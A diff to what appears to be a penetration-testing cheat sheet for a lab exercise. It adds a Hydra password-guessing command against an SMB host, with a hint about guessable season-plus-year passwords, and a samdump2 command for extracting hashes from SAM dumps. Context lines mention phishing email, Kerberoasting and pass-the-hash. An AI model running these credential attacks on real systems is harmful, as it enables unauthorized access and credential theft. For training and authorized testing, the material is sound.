@@ -105,6 +105,10 @@ sendEmail -o tls=no -t target@corp.com -f hacker@foo.bar -s
 # Password Attacks
 ### hashcat
 ### Hydra
+Hint: **Passwords formatted Season + year + punctuation are popular password options (in the case of this exercise, assume the year is 2018).** Example:
+```
+hydra -L domain_users.txt -P pwd_guesses.txt -o output.txt 10.10.10.10 smb.
+```
 ### Kerberoast
 When you have a Meterpreter shell on a target, you may be able to use the Kerberoast method to obtain crack-able strings from the target. 
 ```
@@ -149,6 +153,12 @@ Available commands
 ```
 
 ### samdump2
+
+If you are able to obtain SAM and System dumps (i.e. via smbclient or another method of access), a tool called samdump2 can be helpful in extracting hashes. Assuming your dumps are sam.dmp and sys.dmp, run the following command: 
+```
+samdump2 -o hash.dmp sys.dmp sam.dmp
+```
+Print the hash.dmp file when the function is complete to see the output.
 ### pth-winexe
 Pass the Hash of a user and open a cmd shell. 
 ```
